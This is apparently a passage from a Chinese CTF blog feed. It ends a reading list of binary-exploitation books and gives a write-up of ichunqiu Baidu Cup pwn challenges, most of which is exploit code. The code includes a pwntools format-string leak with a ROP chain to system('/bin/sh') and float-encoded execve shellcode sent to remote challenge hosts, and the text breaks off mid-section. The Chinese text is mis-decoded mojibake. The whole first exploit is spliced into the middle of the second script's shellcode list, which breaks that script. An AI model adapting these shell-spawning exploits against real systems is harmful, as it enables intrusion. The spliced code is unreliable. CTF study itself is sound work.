ç¬¬ä¸€æœ¬è¯¥çœ‹çš„ä¹¦æ˜¯ã€Šæé—®çš„æ™ºæ…§ã€‹ï¼Œé™„ä¸Šä¸€ä¸ªè„‘å›¾ï¼š</p><h1 id="0x01-ä¹¦ç±"><a href="#0x01-ä¹¦ç±" class="headerlink" title="0x01 ä¹¦ç±"></a>0x01 ä¹¦ç±</h1><p><strong>å­¦äºŒè¿›åˆ¶å¦‚æœæ²¡æœ‰æ‹¿çš„å‡ºçš„ä¸€æ‰‹æ•²ä»£ç çš„èƒ½åŠ›æ€ä¹ˆè¡Œï¼Ÿ</strong><br>ã€Šwindowæ ¸å¿ƒç¼–ç¨‹ã€‹<br>ã€ŠC Primer Plusï¼ˆç¬¬6ç‰ˆï¼‰ä¸­æ–‡ç‰ˆã€‹<br>ã€ŠC++ Primer Plus (ç¬¬6ç‰ˆï¼‰ ä¸­æ–‡ç‰ˆã€‹<br>ã€ŠPythonæ ¸å¿ƒç¼–ç¨‹ã€‹<br> ã€ŠPythonç°å¸½å­-é»‘å®¢ä¸é€†å‘å·¥ç¨‹çš„pythonç¼–ç¨‹ä¹‹é“ã€‹<br>ã€ŠPythonè‡ªåŠ¨åŒ–è¿ç»´ï¼šæŠ€æœ¯ä¸æœ€ä½³å®è·µã€‹<br>ã€Šç²¾é€šé»‘å®¢è„šæœ¬ã€‹<br><strong>å­¦äºŒè¿›åˆ¶æ²¡æœ‰ä¸€ç‚¹ç³»ç»ŸçŸ¥è¯†çœŸçš„å¥½å˜›?</strong><br>ã€Šæ·±å…¥ç†è§£Linuxå†…æ ¸ã€‹<br>ã€ŠLinuxå†…æ ¸æºä»£ç æƒ…æ™¯åˆ†æã€‹<br>ã€ŠLinuxå†…æ ¸è®¾è®¡ä¸å®ç°ã€‹<br>ã€Šå¯’æ±Ÿç‹¬é’“:windowså†…æ ¸å®‰å…¨ç¼–ç¨‹ã€‹<br>ã€Šwindowså†…æ ¸æƒ…æ™¯åˆ†æã€‹<br>ã€Šwindowså†…æ ¸åŸç†ä¸å®ç°ã€‹<br>ã€ŠUNIXæ“ä½œç³»ç»Ÿè®¾è®¡ã€‹ -&gt; ã€ŠThe Design of The UNIX Operating Systemã€‹<br>ã€Šé¸Ÿå“¥çš„linuxç§æˆ¿èœã€‹<br><strong>å­¦äºŒè¿›åˆ¶ä¸ä¼šä¸€ç‚¹æŠ€å·§ä¹Ÿä¸å¤ªå¥½å§ **<br> ã€Šreverse C++ã€‹<br>ã€Šc++åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜<br>ã€Šæ ¼è ¢æ±‡ç¼–ï¼šè½¯è„šè°ƒè¯•æ¡ˆä¾‹ã€‹<br>ã€Šé»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸-ç³»ç»Ÿå®æˆ˜ç¯‡ã€‹  äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾<br>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹ ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾<br>ã€Šæ¼æ´æˆ˜äº‰-è½¯ä»¶æ¼æ´åˆ†æç²¾è¦ã€‹  ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾<br>ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾<br>ã€ŠåŠ å¯†ä¸è§£å¯†ã€‹<br>ã€ŠIDA Proæƒå¨æŒ‡å—ã€‹<br>ã€Šreverse engineering for beginnersã€‹<br>**æ‹“å±•</strong><br>ã€Šæ¸¸æˆå¤–æŒ‚å¼€æ”¾è‰ºæœ¯ã€‹<br>ã€Šæ‰è™«æ—¥è®°ã€‹<br>ã€Šé»‘å®¢å…æ€ã€‹<br>ã€Šæ¶æ„ä»£ç åˆ†æã€‹<br>ã€Šå®‰å…¨è½¯ä»¶å¼€å‘ä¹‹é“ã€‹<br>ã€Šæ¨¡ç³Šæµ‹è¯•-å¼ºåˆ¶æ€§å®‰å…¨æ¼æ´å‘æ˜ã€‹<br>ã€Šç°å¸½é»‘å®¢ï¼šæ­£ä¹‰é»‘å®¢çš„é“å¾·è§„èŒƒã€æ¸—é€æµ‹è¯•ã€æ”»å‡»æ–¹æ³•å’Œæ¼æ´åˆ†ææŠ€æœ¯ã€‹</p><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>å…¶å®ä¹¦è¿˜æ˜¯å¾ˆå¤šçš„ æˆ‘æ„Ÿè§‰è¿˜æ˜¯é€‚åˆè‡ªå·± ä»¥åŠå¤§ä¼—çš„ä¹¦å¥½ æ‰€ä»¥æœ‰äº›æˆ‘æ²¡æ”¾ä¸Šæ¥ï¼Œä½†æ˜¯è¿˜æ˜¯æ¬¢è¿è¡¥å…… è°¢è°¢ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ichunqiuç™¾åº¦æ¯-åä¸€æœˆpwnä¸“é¢˜</title>
      <link href="ichuqiu-pwn-November.html"/>
      <url>ichuqiu-pwn-November.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h1><p>ä¸€ä¸ªæº¢å‡ºé¢˜ï¼Œè€ƒç‚¹åœ¨äºæ€ä¹ˆå»leakå‡ºsystemåœ°å€ç„¶åå»æ„é€ ropï¼Œæœ€åå»getshellï¼Œé¢˜ç›®æ•´ä½“æ€è·¯è¿˜æ˜¯å¾ˆæ¸…æ™°çš„å…³é”®æˆ‘ï¼Œæˆ‘è¿˜ä¸ä¼šleak</p><p>è¿™ä¸ªé¢˜ç›®è¿˜æœ‰ä¸€ä¸ªprintfçš„æ ¼å¼åŒ–æ´ï¼Œè¿˜å¯ä»¥é€šè¿‡è¿™ä¸ªå»å†™å»èµ·shellï¼Œä¸è¿‡è¿™ç§æ–¹æ³•æ¯”è¾ƒä¸ä¼˜é›…<br>å­¦ä¹ äº†å­¦ä¹ äº† </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line">DEBUG = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;106.75.84.74&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># simplified r/s function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">delim</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(delim)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rn</span>(<span class="params">count</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvn(count)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ra</span>(<span class="params">count</span>):</span>      <span class="comment"># recv all</span></span><br><span class="line">    buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> count:</span><br><span class="line">        tmp = io.recvn(count)</span><br><span class="line">        buf += tmp</span><br><span class="line">        count -= len(tmp)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sn</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log.info(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">aoti_got = <span class="number">0x601fa8</span></span><br><span class="line">read_got = <span class="number">0x601fb8</span></span><br><span class="line"><span class="comment"># define interactive functions here</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;%37$p&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    libc_start = int(rn(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">    info(<span class="string">&#x27;libc_start :&#x27;</span> + hex(libc_start))</span><br><span class="line">    </span><br><span class="line">    read_libc = u64(rn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    info(<span class="string">&#x27;read_libc :&#x27;</span> + hex(read_libc))</span><br><span class="line">    system = libc_start - <span class="number">0x7fabbb655a55</span> + <span class="number">0x7fabbb6754f0</span></span><br><span class="line"> <span class="comment">#   e = ELF(&#x27;.bc-64&#x27;)</span></span><br><span class="line">  <span class="comment">#  system = libc_start - e.symbols[&#x27;__libc_start_main&#x27;] + e.symbols[&#x27;system&#x27;]</span></span><br><span class="line">    info(<span class="string">&#x27;system :&#x27;</span> + hex(system))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="number">0x602000</span></span><br><span class="line">    pay = <span class="string">&#x27;0&#x27;</span> * <span class="number">40</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed1</span>) <span class="comment"># pop rsi, r15, ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400730</span>) <span class="comment"># read_got</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(system)</span><br><span class="line">    sn(pay.ljust(<span class="number">0x110</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">    io.interactive()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pause()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><h1 id="loading"><a href="#loading" class="headerlink" title="loading"></a>loading</h1><p>è¿™ä¸ªé¢˜ç›®æ˜¯æŸPCTFçš„é¢˜  å…³é”®çš„æ˜¯å»æ„é€ float çš„shellcode<br><a href="https://j31d0.github.io/writeup/2016/04/18/pctf2016-fixedpoint/">writeup</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = [<span class="string">&quot;\x31\xc9&quot;</span>, <span class="comment"># xor ecx, ecx</span></span><br><span class="line">             <span class="string">&quot;\xf7\xe1&quot;</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">&quot;\x51&quot;</span>, <span class="comment"># push ecx</span></span><br><span class="line">             <span class="string">&quot;\xb1\xff&quot;</span>, <span class="comment"># mov cl, 0xFF</span></span><br><span class="line">             <span class="string">&quot;\xb5\xff&quot;</span>, <span class="comment"># mov ch, 0xFF</span></span><br><span class="line">             <span class="string">&quot;\x41&quot;</span>, <span class="comment"># inc ecx</span></span><br><span class="line">             <span class="string">&quot;\xb4\x68&quot;</span>, <span class="comment"># mov ah, 0x68</span></span><br><span class="line">             <span class="string">&quot;\xb0\x73&quot;</span>, <span class="comment"># mov al, 0x73</span></span><br><span class="line">             <span class="string">&quot;\xf7\xe1&quot;</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">&quot;\xb4\x2f&quot;</span>, <span class="comment"># mov ah, 0x2F</span></span><br><span class="line">             <span class="string">&quot;\xb0\x2f&quot;</span>, <span class="comment"># mov al, 0x2F</span></span><br><span class="line">             <span class="string">&quot;\x50&quot;</span>, <span class="comment"># push eax</span></span><br><span class="line">             <span class="string">&quot;\xb4\x6e&quot;</span>, <span class="comment"># mov ah, 0x6e</span></span><br><span class="line">             <span class="string">&quot;\xb0\x69&quot;</span>, <span class="comment"># mov al, 0x69</span></span><br><span class="line">             <span class="string">&quot;\xf7\xe1&quot;</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">&quot;\xb4\x62&quot;</span>, <span class="comment"># mov ah, 0x62</span></span><br><span class="line">             <span class="string">&quot;\xb0\x2f&quot;</span>, <span class="comment"># mov al, 0x2F</span></span><br><span class="line">             <span class="string">&quot;\x50&quot;</span>, <span class="comment"># push eax</span></span><br><span class="line">             <span class="string">&quot;\x31\xc0&quot;</span>, <span class="comment"># xor eax, eax#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line">DEBUG = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># simplified r/s function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">delim</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(delim)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rn</span>(<span class="params">count</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvn(count)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ra</span>(<span class="params">count</span>):</span>      <span class="comment"># recv all</span></span><br><span class="line">    buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> count:</span><br><span class="line">        tmp = io.recvn(count)</span><br><span class="line">        buf += tmp</span><br><span class="line">        count -= len(tmp)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sn</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log.info(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">aoti_got = <span class="number">0x601fa8</span></span><br><span class="line">read_got = <span class="number">0x601fb8</span></span><br><span class="line"><span class="comment"># define interactive functions here</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;%37$p&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    libc_start = int(rn(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">    info(<span class="string">&#x27;libc_start :&#x27;</span> + hex(libc_start))</span><br><span class="line">    </span><br><span class="line">    read_libc = u64(rn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    info(<span class="string">&#x27;read_libc :&#x27;</span> + hex(read_libc))</span><br><span class="line">    system = libc_start - <span class="number">0x7fabbb655a55</span> + <span class="number">0x7fabbb6754f0</span></span><br><span class="line"> <span class="comment">#   e = ELF(&#x27;.bc-64&#x27;)</span></span><br><span class="line">  <span class="comment">#  system = libc_start - e.symbols[&#x27;__libc_start_main&#x27;] + e.symbols[&#x27;system&#x27;]</span></span><br><span class="line">    info(<span class="string">&#x27;system :&#x27;</span> + hex(system))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="number">0x602000</span></span><br><span class="line">    pay = <span class="string">&#x27;0&#x27;</span> * <span class="number">40</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed1</span>) <span class="comment"># pop rsi, r15, ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400730</span>) <span class="comment"># read_got</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(system)</span><br><span class="line">    sn(pay.ljust(<span class="number">0x110</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">    io.interactive()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pause()</span><br><span class="line">    pwn()</span><br><span class="line">             <span class="string">&quot;\x31\xd2&quot;</span>, <span class="comment"># xor edx, edx</span></span><br><span class="line">             <span class="string">&quot;\x31\xc9&quot;</span>, <span class="comment"># xor ecx, ecx</span></span><br><span class="line">             <span class="string">&quot;\x89\xe3&quot;</span>, <span class="comment"># mov ebx, esp</span></span><br><span class="line">             <span class="string">&quot;\xb0\x0b&quot;</span>, <span class="comment"># mov al, 11</span></span><br><span class="line">             <span class="string">&quot;\xcd\x80&quot;</span>] <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">ints_to_send = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> shellcode:</span><br><span class="line">    z = <span class="string">&quot;\x40&quot;</span></span><br><span class="line">    <span class="keyword">if</span> len(instr) == <span class="number">1</span>:</span><br><span class="line">        z = <span class="string">&quot;\x90\x40&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;\x48&quot;</span> + instr[::<span class="number">-1</span>] + z</span><br><span class="line">    a = struct.unpack(<span class="string">&quot;&gt;f&quot;</span>, payload)[<span class="number">0</span>]*<span class="number">2333</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">2147483647</span>:</span><br><span class="line">        log.error(<span class="string">&quot;It&#x27;s too large fam.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    b = str(<span class="string">&quot;&#123;0:f&#125;&quot;</span>.format(a)).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    log.info(b + <span class="string">&quot; &quot;</span> + payload.encode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">    ints_to_send.append(b)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;106.75.84.68&quot;</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ints_to_send:</span><br><span class="line">    r.sendline(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="3-7z"><a href="#3-7z" class="headerlink" title="3.7z"></a>3.7z</h1><p>è¿™ä¸ªé¢˜ç›®å°±å‰å®³äº†ï¼Œå±…ç„¶æœ‰æœ‰ä¸€ä¸ªbackdoorï¼Œåº”è¯¥æ˜¯é¢˜ç›®è®¾è®¡è€…çš„é—®é¢˜å§ï¼Œè¿™ä¸ªé¢˜ç›®æ€è·¯å¾ˆç®€å•ï¼Œå°±æ˜¯åªè¦æ»¡è¶³å›¾ä¸‹çš„checkå°±å¯ä»¥æ‹¿åˆ°ä¸€ä¸ªåé—¨æƒé™äº†</p><p>åé—¨çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œåªè¦è¾“å…¥çš„æ»¡è¶³</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(<span 